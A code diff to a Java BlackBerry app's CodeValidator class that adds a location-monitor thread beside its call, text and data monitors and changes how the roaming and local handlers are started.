@@ -3,11 +3,10 @@ package com.app.project.acropolis.controller;
 import java.util.Timer;
 
 import loggers.Logger;
-import net.rim.device.api.system.Application;
-import net.rim.device.api.system.RadioInfo;
 
 import com.app.project.acropolis.engine.monitor.CallMonitor;
 import com.app.project.acropolis.engine.monitor.DataMonitor;
+import com.app.project.acropolis.engine.monitor.LocationCode;
 import com.app.project.acropolis.engine.monitor.TextMonitor;
 
 /**
@@ -39,11 +38,12 @@ public class CodeValidator implements Runnable
 	{
 		new Logger().LogMessage("Remote Control initiated..");
 		new Logger().LogMessage("Monitoring-Engine initiated....");
-		new Thread(new CallMonitor()).start();
+		new Thread(new LocationCode()).start();
+		new Thread(new CallMonitor()).start();		//for application permission first run
 		new TextMonitor().run();
 		new Timer().schedule(new DataMonitor(),60*1000);
 		new Logger().LogMessage("Positioning Engine enqueued");
-		new Thread(new RoamingHandler()).start();
-		new Thread(new LocalHandler()).start();
+		new RoamingHandler().run();
+		new LocalHandler().run();
 	}
 }
